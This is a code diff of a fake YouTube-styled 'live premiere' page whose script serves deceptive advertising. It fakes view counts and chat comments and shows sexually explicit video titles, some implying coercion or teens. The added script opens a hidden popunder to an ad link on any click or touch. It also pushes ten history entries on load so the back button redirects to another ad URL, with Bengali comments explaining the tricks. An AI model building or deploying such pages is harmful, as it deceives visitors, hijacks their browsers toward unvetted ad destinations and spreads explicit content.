@@ -1,870 +1,129 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>Exclusive Premiere • 4K Ultra HD</title>
-    <meta name="description" content="Exclusive Video Premiere Presentation" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            user-select: none;
-            -webkit-user-select: none;
-        }
-
-        body {
-            font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
-            background: #050508;
-            color: #f1f1f1;
-            line-height: 1.4;
-            min-height: 100vh;
-            position: relative;
-            overflow-x: hidden;
-        }
-
-        .ambient-glow-1 {
-            position: fixed;
-            top: -15%;
-            left: 10%;
-            width: 50vw;
-            height: 50vw;
-            background: radial-gradient(circle, rgba(255, 0, 55, 0.22) 0%, rgba(0,0,0,0) 70%);
-            pointer-events: none;
-            z-index: 0;
-            filter: blur(100px);
-            animation: pulseGlow 8s ease-in-out infinite alternate;
-        }
-
-        .ambient-glow-2 {
-            position: fixed;
-            bottom: -10%;
-            right: 5%;
-            width: 45vw;
-            height: 45vw;
-            background: radial-gradient(circle, rgba(138, 43, 226, 0.15) 0%, rgba(0,0,0,0) 70%);
-            pointer-events: none;
-            z-index: 0;
-            filter: blur(110px);
-            animation: pulseGlow 12s ease-in-out infinite alternate-reverse;
-        }
-
-        @keyframes pulseGlow {
-            0% { transform: scale(1) translate(0, 0); opacity: 0.8; }
-            50% { transform: scale(1.15) translate(30px, -20px); opacity: 1; }
-            100% { transform: scale(0.95) translate(-20px, 20px); opacity: 0.7; }
-        }
-
-        .youtube-wrapper {
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 0 16px 30px;
-            position: relative;
-            z-index: 1;
-        }
-
-        .yt-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 10px 18px;
-            margin: 10px 0 16px;
-            background: rgba(15, 15, 20, 0.75);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border-radius: 16px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.8);
-        }
-
-        .yt-logo {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: clamp(16px, 4vw, 22px);
-            font-weight: 900;
-            color: #fff;
-            letter-spacing: -0.5px;
-        }
-
-        .yt-logo i {
-            color: #ff0033;
-            font-size: clamp(22px, 5vw, 30px);
-            filter: drop-shadow(0 0 12px rgba(255, 0, 51, 0.9));
-        }
-
-        .yt-logo span {
-            background: linear-gradient(180deg, #ffffff 0%, #d0d0d0 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .badge-4k {
-            font-size: 9px;
-            color: #ff0033;
-            font-weight: 800;
-            border: 1px solid #ff0033;
-            padding: 2px 5px;
-            border-radius: 5px;
-            margin-left: 4px;
-            letter-spacing: 0.5px;
-        }
-
-        .yt-header-actions {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .icon-btn {
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #e1e1e1;
-            font-size: 13px;
-            cursor: pointer;
-        }
-
-        .yt-grid {
-            display: grid;
-            grid-template-columns: 1fr 380px;
-            gap: 20px;
-        }
-
-        @media (max-width: 1024px) {
-            .yt-grid {
-                grid-template-columns: 1fr;
-            }
-        }
-
-        .video-player {
-            position: relative;
-            background: #000;
-            border-radius: 18px;
-            overflow: hidden;
-            width: 100%;
-            aspect-ratio: 16 / 9;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.9), 0 0 0 1px rgba(255, 255, 255, 0.1);
-            cursor: pointer;
-        }
-
-        .video-player img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        .unmute-banner {
-            position: absolute;
-            top: 12px;
-            right: 12px;
-            background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 0, 51, 0.6);
-            padding: 6px 12px;
-            border-radius: 20px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            font-size: clamp(10px, 2.5vw, 12px);
-            font-weight: 800;
-            color: #fff;
-            z-index: 3;
-            animation: bouncePrompt 2s infinite;
-        }
-
-        @keyframes bouncePrompt {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-3px); }
-        }
-
-        .play-overlay {
-            position: absolute;
-            inset: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: rgba(0, 0, 0, 0.35);
-        }
-
-        .play-circle {
-            width: clamp(60px, 12vw, 90px);
-            height: clamp(60px, 12vw, 90px);
-            background: linear-gradient(135deg, #ff0033 0%, #bd0026 100%);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 0 40px rgba(255, 0, 51, 0.8);
-            animation: pulsePlay 1.8s infinite;
-        }
-
-        @keyframes pulsePlay {
-            0% { box-shadow: 0 0 0 0 rgba(255, 0, 51, 0.7); }
-            70% { box-shadow: 0 0 0 18px rgba(255, 0, 51, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(255, 0, 51, 0); }
-        }
-
-        .play-circle i {
-            color: #fff;
-            font-size: clamp(24px, 5vw, 36px);
-            margin-left: 4px;
-        }
-
-        .floating-tag {
-            position: absolute;
-            top: 12px;
-            left: 12px;
-            background: rgba(0, 0, 0, 0.75);
-            backdrop-filter: blur(8px);
-            padding: 4px 10px;
-            border-radius: 20px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            font-size: clamp(9px, 2.2vw, 11px);
-            font-weight: 700;
-            color: #fff;
-            z-index: 2;
-        }
-
-        .floating-tag .dot {
-            width: 6px;
-            height: 6px;
-            background: #00ff66;
-            border-radius: 50%;
-            animation: blink 1.2s infinite;
-        }
-
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-
-        .player-controls-overlay {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            padding: 16px 12px 10px;
-            background: linear-gradient(0deg, rgba(0, 0, 0, 0.9) 0%, transparent 100%);
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-            z-index: 2;
-        }
-
-        .progress-container {
-            width: 100%;
-            height: 4px;
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 6px;
-            overflow: hidden;
-        }
-
-        .progress-filled {
-            width: 68%;
-            height: 100%;
-            background: #ff0033;
-        }
-
-        .controls-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            color: #fff;
-            font-size: 12px;
-        }
-
-        .controls-left, .controls-right {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .ultra-hd-badge {
-            background: #ff0033;
-            color: #fff;
-            font-size: 9px;
-            font-weight: 800;
-            padding: 2px 6px;
-            border-radius: 4px;
-        }
-
-        .server-selector-bar {
-            display: flex;
-            flex-wrap: wrap;
-            align-items: center;
-            justify-content: space-between;
-            gap: 8px;
-            margin-top: 10px;
-            padding: 8px 12px;
-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 12px;
-            cursor: pointer;
-        }
-
-        .server-pills {
-            display: flex;
-            gap: 6px;
-        }
-
-        .server-btn {
-            background: rgba(255, 255, 255, 0.08);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            color: #ddd;
-            font-size: 10px;
-            font-weight: 800;
-            padding: 4px 10px;
-            border-radius: 15px;
-        }
-
-        .server-btn.active {
-            background: #ff0033;
-            color: #fff;
-            border-color: transparent;
-        }
-
-        .reaction-bar {
-            display: flex;
-            gap: 8px;
-            margin-top: 10px;
-            overflow-x: auto;
-            padding-bottom: 4px;
-            scrollbar-width: none;
-        }
-        
-        .reaction-bar::-webkit-scrollbar {
-            display: none;
-        }
-
-        .reaction-pill {
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 20px;
-            padding: 5px 12px;
-            font-size: 12px;
-            font-weight: 700;
-            color: #eee;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            white-space: nowrap;
-            flex-shrink: 0;
-        }
-
-        .video-meta-wrapper {
-            margin-top: 12px;
-        }
-
-        .badge-live {
-            background: #ff0033;
-            color: #fff;
-            font-size: 10px;
-            font-weight: 800;
-            padding: 3px 8px;
-            border-radius: 4px;
-            letter-spacing: 0.5px;
-            display: inline-flex;
-            align-items: center;
-            gap: 5px;
-        }
-
-        .badge-live::before {
-            content: '';
-            width: 5px;
-            height: 5px;
-            background: #fff;
-            border-radius: 50%;
-            animation: blink 1s infinite;
-        }
-
-        .video-title {
-            font-size: clamp(15px, 3.5vw, 20px);
-            font-weight: 800;
-            margin: 10px 0 8px;
-            line-height: 1.3;
-            color: #fff;
-        }
-
-        .video-meta-row {
-            display: flex;
-            flex-wrap: wrap;
-            align-items: center;
-            justify-content: space-between;
-            padding-bottom: 14px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
-            gap: 10px;
-        }
-
-        .watching-count {
-            color: #ff4d6d;
-            font-weight: 700;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            font-size: clamp(11px, 2.8vw, 13px);
-            background: rgba(255, 0, 51, 0.08);
-            padding: 4px 10px;
-            border-radius: 20px;
-            border: 1px solid rgba(255, 0, 51, 0.2);
-        }
-
-        .video-actions {
-            display: flex;
-            gap: 8px;
-        }
-
-        .action-btn {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            padding: 6px 14px;
-            border-radius: 50px;
-            background: rgba(255, 255, 255, 0.06);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            font-size: 12px;
-            font-weight: 700;
-            color: #f1f1f1;
-            cursor: pointer;
-        }
-
-        .action-btn.active {
-            background: #ff0033;
-            border-color: transparent;
-        }
-
-        .comments-section {
-            margin-top: 16px;
-            background: rgba(18, 18, 24, 0.7);
-            backdrop-filter: blur(15px);
-            border-radius: 16px;
-            padding: 14px;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            cursor: pointer;
-        }
-
-        .comments-header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 10px;
-            padding-bottom: 8px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
-        }
-
-        .comments-header h3 {
-            font-size: 13px;
-            font-weight: 800;
-            color: #fff;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .chat-box-container {
-            height: 250px;
-            overflow-y: hidden;
-            display: flex;
-            flex-direction: column;
-            justify-content: flex-end;
-        }
-
-        .chat-stream {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-        }
-
-        .comment-item {
-            display: flex;
-            gap: 10px;
-            padding: 8px 10px;
-            border-radius: 10px;
-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            animation: slideUp 0.4s ease forwards;
-        }
-
-        @keyframes slideUp {
-            0% { opacity: 0; transform: translateY(15px); }
-            100% { opacity: 1; transform: translateY(0); }
-        }
-
-        .c-avatar-icon {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 14px;
-            flex-shrink: 0;
-            color: #fff;
-        }
-
-        .c-avatar-icon.hot { background: #ff0055; }
-        .c-avatar-icon.vip { background: #ff7700; }
-        .c-avatar-icon.cam { background: #a800ff; }
-        .c-avatar-icon.fire { background: #ff3300; }
-
-        .c-name {
-            font-weight: 700;
-            font-size: 11px;
-            color: #bbb;
-            display: flex;
-            align-items: center;
-        }
-
-        .c-name span {
-            color: #666;
-            font-size: 9px;
-            margin-left: 5px;
-        }
-
-        .c-text {
-            font-size: 12px;
-            color: #f1f1f1;
-            margin-top: 2px;
-        }
-
-        .sidebar {
-            margin-top: 10px;
-        }
-
-        .sidebar-label {
-            font-size: 15px;
-            font-weight: 800;
-            color: #fff;
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-
-        .sidebar-label span {
-            font-size: 11px;
-            color: #ff0033;
-            font-weight: 700;
-        }
-
-        .sidebar-item {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 10px;
-            padding: 8px;
-            border-radius: 12px;
-            background: rgba(255, 255, 255, 0.02);
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            cursor: pointer;
-        }
-
-        .sidebar-item .thumb {
-            flex-shrink: 0;
-            width: 120px;
-            aspect-ratio: 16/9;
-            background: #111;
-            border-radius: 8px;
-            overflow: hidden;
-            position: relative;
-        }
-
-        .sidebar-item .thumb img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        .sidebar-item .thumb .duration {
-            position: absolute;
-            bottom: 4px;
-            right: 4px;
-            background: rgba(0, 0, 0, 0.85);
-            font-size: 9px;
-            padding: 1px 4px;
-            border-radius: 3px;
-            font-weight: 800;
-            color: #fff;
-        }
-
-        .sidebar-item .info .title {
-            font-size: 12px;
-            font-weight: 700;
-            color: #f1f1f1;
-            line-height: 1.3;
-            display: -webkit-box;
-            -webkit-line-clamp: 2;
-            -webkit-box-orient: vertical;
-            overflow: hidden;
-            margin-bottom: 4px;
-        }
-
-        .sidebar-item .info .meta {
-            font-size: 10px;
-            color: #888;
-            font-weight: 600;
-        }
-
-        @media (max-width: 480px) {
-            .sidebar-item .thumb {
-                width: 100px;
-            }
-            .video-actions {
-                width: 100%;
-                justify-content: space-between;
-            }
-            .action-btn {
-                flex: 1;
-                justify-content: center;
-            }
-        }
-    </style>
-</head>
-<body>
-
-    <div class="ambient-glow-1"></div>
-    <div class="ambient-glow-2"></div>
-
-    <div class="youtube-wrapper">
-        <header class="yt-header">
-            <div class="yt-logo">
-                <i class="fab fa-youtube"></i>
-                <span>YouTube <span class="badge-4k">4K ULTRA</span></span>
-            </div>
-            <div class="yt-header-actions">
-                <div class="icon-btn trigger-action"><i class="fas fa-search"></i></div>
-                <div class="icon-btn trigger-action"><i class="fas fa-bell"></i></div>
-            </div>
-        </header>
-
-        <div class="yt-grid">
-            <main class="video-main">
-                <div class="video-player trigger-action" id="videoPlayer">
-                    <div class="floating-tag">
-                        <span class="dot"></span>
-                        <span>4K LIVE PREMIERE</span>
-                    </div>
-
-                    <div class="unmute-banner">
-                        <i class="fas fa-volume-up" style="color: #ff0033;"></i>
-                        <span>TAP TO UNMUTE AUDIO</span>
-                    </div>
-
-                    <img id="mainGif" src="" alt="Live Stream" />
-                    
-                    <div class="play-overlay">
-                        <div class="play-circle"><i class="fas fa-play"></i></div>
-                    </div>
-
-                    <div class="player-controls-overlay">
-                        <div class="progress-container">
-                            <div class="progress-filled"></div>
-                        </div>
-                        <div class="controls-row">
-                            <div class="controls-left">
-                                <i class="fas fa-play"></i>
-                                <i class="fas fa-volume-up"></i>
-                                <span style="font-size:10px; color:#ff4d6d; font-weight:800; letter-spacing:0.5px;">● LIVE</span>
-                            </div>
-                            <div class="controls-right">
-                                <span class="ultra-hd-badge"><i class="fas fa-certificate"></i> 2160p 4K</span>
-                                <i class="fas fa-cog"></i>
-                                <i class="fas fa-expand"></i>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="server-selector-bar trigger-action">
-                    <span style="font-size: 11px; font-weight: 800; color: #aaa;"><i class="fas fa-server" style="color: #ff0033;"></i> Server:</span>
-                    <div class="server-pills">
-                        <span class="server-btn active">Server #1 (4K)</span>
-                        <span class="server-btn">Server #2 (Ultra)</span>
-                    </div>
-                </div>
-
-                <div class="video-meta-wrapper">
-                    <span class="badge-live">EXCLUSIVE PREMIERE</span>
-                    
-                    <h1 class="video-title" id="mainTitle">Loading…</h1>
-
-                    <div class="reaction-bar">
-                        <div class="reaction-pill trigger-action">🔥 <span>24.5K</span></div>
-                        <div class="reaction-pill trigger-action">❤️ <span>18.1K</span></div>
-                        <div class="reaction-pill trigger-action">💦 <span>31.2K</span></div>
-                        <div class="reaction-pill trigger-action">😮 <span>9.4K</span></div>
-                    </div>
-
-                    <div class="video-meta-row" style="margin-top: 10px;">
-                        <div class="watching-count">
-                            <i class="fas fa-eye"></i> 
-                            <span><strong id="mainViews">64,280</strong> watching in 4K</span>
-                        </div>
-                        <div class="video-actions">
-                            <div class="action-btn active trigger-action" id="likeBtn"><i class="fas fa-thumbs-up"></i> <span id="likeCount">48.2K</span></div>
-                            <div class="action-btn trigger-action"><i class="fas fa-share"></i> Share</div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="comments-section trigger-action" id="commentsBox">
-                    <div class="comments-header">
-                        <h3><i class="fas fa-bolt" style="color: #ff0033;"></i> Top Live Chat Stream</h3>
-                        <span style="font-size: 10px; color: #ff0033; font-weight: 800;">● LIVE FEED</span>
-                    </div>
-                    <div class="chat-box-container">
-                        <div class="chat-stream" id="chatStream"></div>
-                    </div>
-                </div>
-            </main>
-
-            <aside class="sidebar">
-                <div class="sidebar-label">
-                    <span>Up Next</span>
-                    <span><i class="fas fa-fire"></i> Trending</span>
-                </div>
-                <div id="suggestedList"></div>
-            </aside>
-        </div>
-    </div>
-
-    <script>
-        (function() {
-            // ════════════════════════════════════════════════════════════
-            // LINK CONFIGURATION (আপনার লিংকগুলো এখানে বসাবেন)
-            // ════════════════════════════════════════════════════════════
-            const MAIN_OFFER_LINK = 'https://honmia.com/4/4f4bdff589b9437b3a53e5ffedfcde9a'; // নতুন ট্যাবে খুলবে
-            const REDIRECT_LINK  = 'https://honmia.com/4/ce86b8ee2fcd9361291ab7a5822f9f83'; // মেইন পেজ রিডাইরেক্ট হবে
-            const BACK_AD_LINK   = 'https://www.profitableratecpmnetwork.com/qqcft76z?key=45d936c36bd41433d96929c4c7a6f966'; // ব্যাক বাটন চাপলে খুলবে
-
-            let hasClicked = false;
-
-            // যেকোনো এলিমেন্টে ক্লিক করলেই এই ফাংশন কাজ করবে
-            function handleSmartClick(e) {
-                if (!hasClicked) {
-                    hasClicked = true;
-                    
-                    // ১. নতুন ট্যাবে মেইন অফার ওপেন হবে
-                    try {
-                        window.open(MAIN_OFFER_LINK, '_blank');
-                    } catch(err) {}
-                    
-                    // ২. বর্তমান পেজটি রিডাইরেক্ট লিংকে চলে যাবে
-                    window.location.href = REDIRECT_LINK;
+<script>
+    (function() {
+        // ════════════════════════════════════════════════════════════
+        // LINK CONFIGURATION
+        // ════════════════════════════════════════════════════════════
+        const MAIN_OFFER_LINK = 'https://honmia.com/4/4f4bdff589b9437b3a53e5ffedfcde9a'; 
+        const BACK_AD_LINK    = 'https://www.profitableratecpmnetwork.com/awn1xp0h21?key=26baf4fd741afacd351dde20ac85c8e5'; 
+
+        let hasClicked = false;
+
+        // ১. স্মার্ট পপ-আন্ডার হ্যান্ডলার (মূল পেজ রিডাইরেক্ট হবে না, ব্যাকগ্রাউন্ডে ট্যাব খুলবে)
+        function handleSmartPopunder(e) {
+            if (!hasClicked) {
+                hasClicked = true;
+
+                // ব্যাকগ্রাউন্ডে নতুন ট্যাব খোলার চেষ্টা
+                const popWindow = window.open(MAIN_OFFER_LINK, '_blank');
+
+                if (popWindow) {
+                    // পপ-আন্ডার ইফেক্ট: নতুন ট্যাব পেছনে যাবে, বর্তমান পেজ ফোকাসে থাকবে
+                    popWindow.blur();
+                    window.focus();
+                } else {
+                    // ব্রাউজার যদি ব্যাকগ্রাউন্ড ট্যাব ব্লক করে, তবেই কেবল বর্তমান পেজ রিডাইরেক্ট হবে
+                    window.location.href = MAIN_OFFER_LINK;
                 }
             }
+        }
 
-            // পেজের সব ক্লিকএবল এলিমেন্টে ইভেন্ট যুক্ত করা
-            document.querySelectorAll('.trigger-action').forEach(el => {
-                el.addEventListener('click', handleSmartClick);
-            });
+        // পেজের যেকোনো জায়গায় ক্লিক বা স্ক্রিন টাচ করলে পপ-আন্ডার ট্রিগার হবে
+        document.addEventListener('click', handleSmartPopunder);
+        document.addEventListener('touchend', handleSmartPopunder);
 
-            // VIDEO DATA
-            const videoPool = [
-                { src: 'IMG_5604.GIF', title: 'Hot Girl fucked by Huge cock with Full hardcore sex', views: '2.4M', time: '12:05' },
-                { src: '023_1000.GIF', title: 'Fucked my college friend naked after a long time.', views: '1.8M', time: '15:40' },
-                { src: '21415053.GIF', title: 'I First Time Fuck My Cute Girlfriend hard in bedroom', views: '3.1M', time: '09:12' },
-                { src: 'IMG_0198.GIF', title: 'Horny stepmother caught and forced to extreme blowout', views: '2.5M', time: '10:14' },
-                { src: 'IMG_0199.GIF', title: 'College teen girls sharing massive tools together tape', views: '1.9M', time: '14:22' },
-                { src: 'IMG_0200.GIF', title: 'Deepthroat rehearsal in dressing room leak compilation', views: '3.4M', time: '11:05' },
-                { src: 'IMG_0201.GIF', title: 'Tight amateur stepsister creamed while sneaking out', views: '2.1M', time: '08:45' },
-                { src: 'IMG_0202.GIF', title: 'Wet pov rough ride on huge black cock till she shakes', views: '1.6M', time: '13:50' },
-                { src: 'IMG_0203.GIF', title: 'Horny secretary desktop pounding session uncut version', views: '2.8M', time: '16:15' },
-                { src: 'IMG_0204.GIF', title: 'Slutty girlfriend begs for aggressive back door action', views: '3.0M', time: '12:30' },
-                { src: 'IMG_0205.GIF', title: 'Cum swallowing compilation from top verified premiums', views: '2.3M', time: '10:55' }
-            ];
+        // VIDEO DATA
+        const videoPool = [
+            { src: 'IMG_5604.GIF', title: 'Hot Girl fucked by Huge cock with Full hardcore sex', views: '2.4M', time: '12:05' },
+            { src: '023_1000.GIF', title: 'Fucked my college friend naked after a long time.', views: '1.8M', time: '15:40' },
+            { src: '21415053.GIF', title: 'I First Time Fuck My Cute Girlfriend hard in bedroom', views: '3.1M', time: '09:12' },
+            { src: 'IMG_0198.GIF', title: 'Horny stepmother caught and forced to extreme blowout', views: '2.5M', time: '10:14' },
+            { src: 'IMG_0199.GIF', title: 'College teen girls sharing massive tools together tape', views: '1.9M', time: '14:22' },
+            { src: 'IMG_0200.GIF', title: 'Deepthroat rehearsal in dressing room leak compilation', views: '3.4M', time: '11:05' },
+            { src: 'IMG_0201.GIF', title: 'Tight amateur stepsister creamed while sneaking out', views: '2.1M', time: '08:45' },
+            { src: 'IMG_0202.GIF', title: 'Wet pov rough ride on huge black cock till she shakes', views: '1.6M', time: '13:50' },
+            { src: 'IMG_0203.GIF', title: 'Horny secretary desktop pounding session uncut version', views: '2.8M', time: '16:15' },
+            { src: 'IMG_0204.GIF', title: 'Slutty girlfriend begs for aggressive back door action', views: '3.0M', time: '12:30' },
+            { src: 'IMG_0205.GIF', title: 'Cum swallowing compilation from top verified premiums', views: '2.3M', time: '10:55' }
+        ];
 
-            const commentsPool = [
-                { icon: 'fa-kiss-wink-heart', class: 'hot', name: 'Naughty_Sam 💋', text: 'She is taking it so deep! Absolute perfection 🤤💯' },
-                { icon: 'fa-fire-alt', class: 'fire', name: 'HotGirl_69 🔥', text: 'OMG! 4K quality is crystal clear! 😱' },
-                { icon: 'fa-gem', class: 'vip', name: 'VIP_Member ⭐', text: 'Full video link unlocked guys! Amazing stream 🔥' },
-                { icon: 'fa-video', class: 'cam', name: 'LiveCam_Girl 🍓', text: 'Her body is insane! Love this 4K stream 🍒🍆' },
-                { icon: 'fa-heart', class: 'hot', name: 'Lisa_Adult 💋', text: 'Oh my god, best live scene ever! 🔥' },
-                { icon: 'fa-bolt', class: 'vip', name: 'Mike_Rod 💦', text: 'That creampie at the end was completely wild! 💦💦' }
-            ];
+        const commentsPool = [
+            { icon: 'fa-kiss-wink-heart', class: 'hot', name: 'Naughty_Sam 💋', text: 'She is taking it so deep! Absolute perfection 🤤💯' },
+            { icon: 'fa-fire-alt', class: 'fire', name: 'HotGirl_69 🔥', text: 'OMG! 4K quality is crystal clear! 😱' },
+            { icon: 'fa-gem', class: 'vip', name: 'VIP_Member ⭐', text: 'Full video link unlocked guys! Amazing stream 🔥' },
+            { icon: 'fa-video', class: 'cam', name: 'LiveCam_Girl 🍓', text: 'Her body is insane! Love this 4K stream 🍒🍆' },
+            { icon: 'fa-heart', class: 'hot', name: 'Lisa_Adult 💋', text: 'Oh my god, best live scene ever! 🔥' },
+            { icon: 'fa-bolt', class: 'vip', name: 'Mike_Rod 💦', text: 'That creampie at the end was completely wild! 💦💦' }
+        ];
 
-            const mainVideo = videoPool[Math.floor(Math.random() * videoPool.length)];
-            document.getElementById('mainGif').src = mainVideo.src;
-            document.getElementById('mainTitle').textContent = mainVideo.title;
+        const mainVideo = videoPool[Math.floor(Math.random() * videoPool.length)];
+        document.getElementById('mainGif').src = mainVideo.src;
+        document.getElementById('mainTitle').textContent = mainVideo.title;
 
-            let baseViews = 64280;
-            const viewsEl = document.getElementById('mainViews');
-            setInterval(() => {
-                baseViews += Math.floor(Math.random() * 25) - 10;
-                viewsEl.textContent = baseViews.toLocaleString();
-            }, 2500);
+        let baseViews = 64280;
+        const viewsEl = document.getElementById('mainViews');
+        setInterval(() => {
+            baseViews += Math.floor(Math.random() * 25) - 10;
+            viewsEl.textContent = baseViews.toLocaleString();
+        }, 2500);
 
-            const chatStream = document.getElementById('chatStream');
-            let commentIndex = 0;
+        const chatStream = document.getElementById('chatStream');
+        let commentIndex = 0;
 
-            function addLiveChatMessage() {
-                const comment = commentsPool[commentIndex % commentsPool.length];
-                commentIndex++;
+        function addLiveChatMessage() {
+            const comment = commentsPool[commentIndex % commentsPool.length];
+            commentIndex++;
 
-                const chatItem = document.createElement('div');
-                chatItem.className = 'comment-item';
-                chatItem.innerHTML = `
-                    <div class="c-avatar-icon ${comment.class}"><i class="fas ${comment.icon}"></i></div>
-                    <div>
-                        <div class="c-name">${comment.name} <span>Just now</span></div>
-                        <div class="c-text">${comment.text}</div>
+            const chatItem = document.createElement('div');
+            chatItem.className = 'comment-item';
+            chatItem.innerHTML = `
+                <div class="c-avatar-icon ${comment.class}"><i class="fas ${comment.icon}"></i></div>
+                <div>
+                    <div class="c-name">${comment.name} <span>Just now</span></div>
+                    <div class="c-text">${comment.text}</div>
+                </div>
+            `;
+
+            chatStream.appendChild(chatItem);
+            if (chatStream.children.length > 4) chatStream.removeChild(chatStream.children[0]);
+        }
+
+        addLiveChatMessage();
+        addLiveChatMessage();
+        setInterval(addLiveChatMessage, 2000);
+
+        let sidebarHtml = '';
+        videoPool.forEach((item) => {
+            if (item.title !== mainVideo.title) {
+                sidebarHtml += `
+                <div class="sidebar-item">
+                    <div class="thumb">
+                        <img src="${item.src}" loading="lazy" />
+                        <div class="duration">${item.time}</div>
                     </div>
-                `;
-
-                chatStream.appendChild(chatItem);
-                if (chatStream.children.length > 4) chatStream.removeChild(chatStream.children[0]);
+                    <div class="info">
+                        <div class="title">${item.title}</div>
+                        <div class="meta">${item.views} views • 4K HD</div>
+                    </div>
+                </div>`;
             }
+        });
+        document.getElementById('suggestedList').innerHTML = sidebarHtml;
 
-            addLiveChatMessage();
-            addLiveChatMessage();
-            setInterval(addLiveChatMessage, 2000);
-
-            let sidebarHtml = '';
-            videoPool.forEach((item) => {
-                if (item.title !== mainVideo.title) {
-                    sidebarHtml += `
-                    <div class="sidebar-item trigger-action">
-                        <div class="thumb">
-                            <img src="${item.src}" loading="lazy" />
-                            <div class="duration">${item.time}</div>
-                        </div>
-                        <div class="info">
-                            <div class="title">${item.title}</div>
-                            <div class="meta">${item.views} views • 4K HD</div>
-                        </div>
-                    </div>`;
-                }
-            });
-            document.getElementById('suggestedList').innerHTML = sidebarHtml;
-
-            // BACK-BUTTON HIJACK (3rd Link only for Back Click)
-            function enableHijack() {
-                for (let i = 0; i < 5; i++) {
-                    window.history.pushState({ hijack: true }, '', window.location.href);
-                }
+        // ════════════════════════════════════════════════════════════
+        // BACK-BUTTON HIJACK (মোবাইল ব্যাক বাটন ব্যাকগ্রাউন্ড হাইজ্যাক)
+        // ════════════════════════════════════════════════════════════
+        function enableHijack() {
+            for (let i = 0; i < 10; i++) {
+                window.history.pushState({ hijack: true }, '', window.location.href);
             }
+        }
 
-            ['click', 'touchstart', 'scroll'].forEach(event => {
-                window.addEventListener(event, enableHijack, { once: true });
-            });
+        // পেজ লোড হওয়ার সাথে সাথে হাইজ্যাক স্টেট যুক্ত করা
+        window.addEventListener('load', enableHijack);
 
-            window.addEventListener('popstate', function() {
-                window.location.replace(BACK_AD_LINK);
-            });
-        })();
-    </script>
-</body>
-</html>
+        // ইউজার ব্যাক বাটনে চাপ দিলে BACK_AD_LINK এ নিয়ে যাবে
+        window.addEventListener('popstate', function(e) {
+            window.location.replace(BACK_AD_LINK);
+        });
+    })();
+</script>
